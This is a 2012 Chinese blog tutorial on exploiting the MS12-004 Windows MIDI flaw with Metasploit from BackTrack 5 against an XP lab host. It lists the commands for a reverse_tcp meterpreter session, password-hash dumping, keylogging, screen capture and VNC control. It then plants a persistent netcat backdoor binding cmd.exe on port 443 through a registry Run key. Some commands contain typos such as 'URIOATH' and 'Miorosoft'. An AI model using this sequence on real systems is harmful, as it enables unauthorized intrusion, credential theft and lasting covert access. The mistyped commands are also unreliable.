---
title: 利用Metasploit进行渗透测试
tags:
  - Backtrack
  - Breaker
  - BT5
  - Metasploit
  - meterpreter
  - Netcat
  - 漏洞
id: 165
categories:
  - Hacking
date: 2012-04-11 11:35:53
---

声明：本教程仅限供广大网络安全爱好者交流学习之用，任何人不得用于非法用途，否则后果自负。

最近在玩Backtrack 5 ，就把最近学到的东西分享下。

所有工具都是Backtrack 5 自带的，

用到的工具 ： 大名鼎鼎的Metasploit Feamwork    还有 Netcat

<!--more-->

要利用的漏洞：MS12-004 ，虽然漏洞是几个月前出的了，但这里只做渗透演示，重点在讲解工具的使用方法。

废话不说，看步骤 ：

&nbsp;

在控制台执行 msfconsole 启动Metasploit  ，

![](http://pic.0x7c00.cn/metasploit/1.png)

&nbsp;

输入命令 search ms12_004，我们来找找ms12-004漏洞的利用模块

![](http://pic.0x7c00.cn/metasploit/2.png)

&nbsp;

已经找到了，接下来使用该模块

输入命令  Use exploits/windows/browser/ms12_004_midi

![](http://pic.0x7c00.cn/metasploit/3.png)

&nbsp;

接下来输入命令 show options ，显示该漏洞的基本信息，以及要设置的参数

![](http://pic.0x7c00.cn/metasploit/4.png)

&nbsp;

设置参数：

输入命令 ： set  SRVHOST  192.168.42.139

Set  PAYLOAD  windows/meterpreter/reverse_tcp

Set  LHOST  192.168.42.130

Set  URIOATH  /

&nbsp;

最后 再输入show options ，查看是否设置好

![](http://pic.0x7c00.cn/metasploit/5.png)

&nbsp;

已经OK了，开始渗透。

执行命令 ：Exploit

![](http://pic.0x7c00.cn/metasploit/6.png)

&nbsp;

可以看到服务已经启动了，链接地址[http://192.168.42.130:8080/](http://192.168.42.130:8080/)

在用Xp打开恶意链接地址 [http://192.168.42.130:8080/](http://192.168.42.130:8080/)

![](http://pic.0x7c00.cn/metasploit/7.png)

&nbsp;

BackTrack 开始渗透，

这边BT5已经有反应了 ，渗透成功~

![](http://pic.0x7c00.cn/metasploit/8.png)

&nbsp;

输入命令 Sessions

![](http://pic.0x7c00.cn/metasploit/9.png)

&nbsp;

我们看到有一个会话，会话的 ID 是1  ，开打开这个会话

输入命令 Sessions  -i  1 这时，我们已经进入了Meterpreter

&nbsp;

![](http://pic.0x7c00.cn/metasploit/10.png)

&nbsp;

Meterpreter 是一个很强大的 payload ， 具体说明输入 help 可以看到，

Meterpreter  &gt;  hashdump     // 可以看到远程主机帐号和加密后的密码

![](http://pic.0x7c00.cn/metasploit/11.png)

这里再说几个常用的Meterpreter  命令

&nbsp;

Meterpreter  &gt;  keyscan_start   //开启键盘记录

&nbsp;

Meterpreter  &gt;  heyscan_dump  //  查看键盘记录的内容

Meterpreter  &gt;  keyscan_stop    //  关闭键盘记录

Meterpreter  &gt;  shell   //看下图大家都懂的

![](http://pic.0x7c00.cn/metasploit/12.png)

Meterpreter  &gt; ps  //  获取远程主机进程列表，比windows自带的任务管理器清晰多了

![](http://pic.0x7c00.cn/metasploit/13.png)

Meterpreter  &gt; screenshot   //  截取远程桌面屏幕

![](http://pic.0x7c00.cn/metasploit/14.png)

Meterpreter  &gt; run vnc  // 开启远程主机vnc 服务

过一会，可以看到桌面，并且可以控制鼠标和键盘

![](http://pic.0x7c00.cn/metasploit/15.png)

&nbsp;

好，下来我们来留后门，方便以后常来 ~

先上传 nc.exe（netcant）到windows的systen32文件夹下

Upload   /pentest/windows-binaries/tools/nc.exe   c:\windows\system32

![](http://pic.0x7c00.cn/metasploit/16.png)

&nbsp;

已经成功了，下来我们将nc.exe加到注册表，让他开机自启动

&nbsp;

先查看注册表

Reg  enumkey  -k  HKLM\SOFTWARE\Miorosoft\Windows\CurrentVersion\Run

![](http://pic.0x7c00.cn/metasploit/17.png)

已经可以看到注册表键值了

下来加入注册表

Reg  setval  -k  HKLM\SOFTWARE\Miorosoft\Windows\CurrentVersion\Run  -v  backdoor  -d  c:\windows\system32\nc.exe"-L  -d  -p  443  cmd.exe"

（上面是一条命令）

![](http://pic.0x7c00.cn/metasploit/18.png)

提示成功，看看XP的注册表

![](http://pic.0x7c00.cn/metasploit/19.png)

已经有了这个键值

我们重启远程主机试下

输命令 reboot

![](http://pic.0x7c00.cn/metasploit/20.png)

由于远程主机已经关闭，显示链接断开 ，等xp重启后，我们试试留的后门

Telnet   192.168.42.139   443

![](http://pic.0x7c00.cn/metasploit/21.png)

已经连接成功了  : )  .。刚接触BT5，各位见笑了  ... 论坛有玩B5或者 Metasploit 的朋友可以联系我，求交流。

QQ :791628659

                                                                                          By  Breaker

本文地址[http://0x7c00.cn/?p=165](http://blog.0x7c00.cn/?p=165)

2012年4月10日11:34:16